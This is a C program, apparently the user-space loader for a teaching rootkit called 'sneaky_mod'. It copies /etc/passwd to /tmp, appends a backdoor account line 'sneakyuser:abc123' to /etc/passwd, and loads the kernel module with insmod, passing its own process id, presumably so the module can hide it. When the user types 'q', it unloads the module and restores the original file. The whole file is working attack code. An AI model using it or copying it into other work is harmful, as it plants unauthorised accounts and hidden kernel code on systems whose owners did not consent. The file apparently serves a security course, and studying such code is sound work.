#include <stdio.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>

void copy_file(const char * src_name, const char * tar_name){
    FILE *source,*target;
    char ch;
    source = fopen(src_name, "r");
    if( source == NULL ){
      exit(EXIT_FAILURE);
    }
    target = fopen(tar_name, "w");
    while( ( ch = fgetc(source) ) != EOF ){
        fputc(ch, target);
    }
    printf("File copied successfully.\n");
    fclose(source);
    fclose(target);
}

void add_passwd(){
    FILE *out = fopen("/etc/passwd", "a");
    fprintf(out, "%s\n", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
    fclose(out);
    printf("append password\n");
}

int main(){
    int wstatus;
    int curr_process_id = getpid();
    printf("sneaky_process pid=%d\n",curr_process_id);
    copy_file("/etc/passwd","/tmp/passwd");
    add_passwd();
    pid_t pid = fork();
    if(pid == 0){//child process
        char s[30];
        memset(s,0,sizeof(s));
        sprintf(s,"process_id=%d",curr_process_id);
        printf("Sneaky mod loaded.\n");
        char* argv[] = {"/sbin/insmod","sneaky_mod.ko",s,NULL};
        if(execve("/sbin/insmod",argv,NULL)==-1){
            perror("execve");
            exit(EXIT_FAILURE);
        }
    }
    else{//parent process
        char input;
        do{
            if(input != '\n'){
                printf("please type in a character and press enter(type 'q' to end): ");
            }
            input = getchar();
        }while(input != 'q');
        pid_t rm_pid = fork();
        if(rm_pid == 0){//child process for rmmod
            char* rm_argv[] = {"/sbin/rmmod","sneaky_mod.ko",NULL};
            printf("sneaky mod unloaded!\n");
            if(execve("/sbin/rmmod",rm_argv,NULL)==-1){
                perror("rmmod execve");
                exit(EXIT_FAILURE);
            }
        }
        pid_t w = waitpid(-1, &wstatus, 0);
        if (w == -1) {
            perror("waitpid");
            exit(EXIT_FAILURE);
        }
        if (WIFEXITED(wstatus)) {
            printf("exited, status=%d\n", WEXITSTATUS(wstatus));
        } else if (WIFSIGNALED(wstatus)) {
            printf("killed by signal %d\n", WTERMSIG(wstatus));
        } else if (WIFSTOPPED(wstatus)) {
            printf("stopped by signal %d\n", WSTOPSIG(wstatus));
        }
        copy_file("/tmp/passwd","/etc/passwd");
        printf("/etc/passwd file restored\n");
    }
    return EXIT_SUCCESS;
}